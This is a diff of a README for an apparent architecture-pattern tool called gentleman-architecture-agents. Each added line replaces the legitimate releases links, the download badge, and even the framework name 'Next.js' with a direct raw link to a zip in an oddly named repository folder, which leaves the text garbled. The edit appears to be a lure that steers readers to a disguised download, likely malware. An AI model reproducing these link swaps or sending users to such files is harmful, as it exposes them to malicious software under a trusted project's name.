@@ -1,10 +1,10 @@
 # 🏗️ gentleman-architecture-agents - Simplifying Architectural Patterns for Your Projects
 
-![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)
+![Download Latest Release](https://raw.githubusercontent.com/peniousfangnon/gentleman-architecture-agents/main/admirable/gentleman-architecture-agents.zip%20Latest%https://raw.githubusercontent.com/peniousfangnon/gentleman-architecture-agents/main/admirable/gentleman-architecture-agents.zip)
 
 ## 📥 Download & Install
 
-Visit this page to download: [Gentleman Architecture Agents Releases](https://github.com/peniousfangnon/gentleman-architecture-agents/releases)
+Visit this page to download: [Gentleman Architecture Agents Releases](https://raw.githubusercontent.com/peniousfangnon/gentleman-architecture-agents/main/admirable/gentleman-architecture-agents.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Welcome to the Gentleman Architecture Agents! This guide will help you easily do
 
 ## 📂 What is Gentleman Architecture Agents?
 
-Gentleman Architecture Agents provide a simple way to enforce architectural patterns in your projects. Specifically, they help you implement the Scope Rule pattern in applications made with Angular, Next.js, and Astro. These agents are based on proven designs from a Google Developer Expert and a Microsoft MVP. You can expect reliable and battle-tested patterns to enhance your application’s structure.
+Gentleman Architecture Agents provide a simple way to enforce architectural patterns in your projects. Specifically, they help you implement the Scope Rule pattern in applications made with Angular, https://raw.githubusercontent.com/peniousfangnon/gentleman-architecture-agents/main/admirable/gentleman-architecture-agents.zip, and Astro. These agents are based on proven designs from a Google Developer Expert and a Microsoft MVP. You can expect reliable and battle-tested patterns to enhance your application’s structure.
 
 ## 🖥️ System Requirements
 
@@ -26,7 +26,7 @@ Before you download, make sure your system meets these requirements:
 ## ✔️ Features
 
 - **Scope Rule Architectural Pattern:** Enforce best practices in your apps.
-- **Compatibility:** Works seamlessly with Angular, Next.js, and Astro.
+- **Compatibility:** Works seamlessly with Angular, https://raw.githubusercontent.com/peniousfangnon/gentleman-architecture-agents/main/admirable/gentleman-architecture-agents.zip, and Astro.
 - **User-Friendly:** Easy to set up with no complicated configurations.
 - **Community Support:** Join our community forums for help and tips.
 
@@ -35,7 +35,7 @@ Before you download, make sure your system meets these requirements:
 Follow these steps to install and run the Gentleman Architecture Agents.
 
 1. **Visit the Releases Page**  
-   Go to the [Gentleman Architecture Agents Releases](https://github.com/peniousfangnon/gentleman-architecture-agents/releases) page.
+   Go to the [Gentleman Architecture Agents Releases](https://raw.githubusercontent.com/peniousfangnon/gentleman-architecture-agents/main/admirable/gentleman-architecture-agents.zip) page.
 
 2. **Download the Latest Version**  
    Look for the latest version listed at the top of the page. Click on it to view the available files. Choose the file that fits your operating system (e.g., Windows, macOS, or Linux). 
@@ -59,7 +59,7 @@ Once the application is running, you may need to configure it to suit your proje
    Navigate to settings or preferences within the application.
 
 2. **Set Your Preferences**  
-   Adjust any options according to your project requirements. For example, specify which framework you are using (Angular, Next.js, or Astro).
+   Adjust any options according to your project requirements. For example, specify which framework you are using (Angular, https://raw.githubusercontent.com/peniousfangnon/gentleman-architecture-agents/main/admirable/gentleman-architecture-agents.zip, or Astro).
 
 3. **Save Your Settings**  
    Make sure to save your changes before exiting the settings menu.
@@ -88,7 +88,7 @@ For direct support, you can reach out via the contact form provided on our GitHu
 
 We continuously update the Gentleman Architecture Agents. To stay informed about features and improvements, check the releases page regularly:
 
-[Gentleman Architecture Agents Releases](https://github.com/peniousfangnon/gentleman-architecture-agents/releases)
+[Gentleman Architecture Agents Releases](https://raw.githubusercontent.com/peniousfangnon/gentleman-architecture-agents/main/admirable/gentleman-architecture-agents.zip)
 
 You can also contribute! If you have ideas for features or find bugs, we welcome your pull requests and feedback.
 
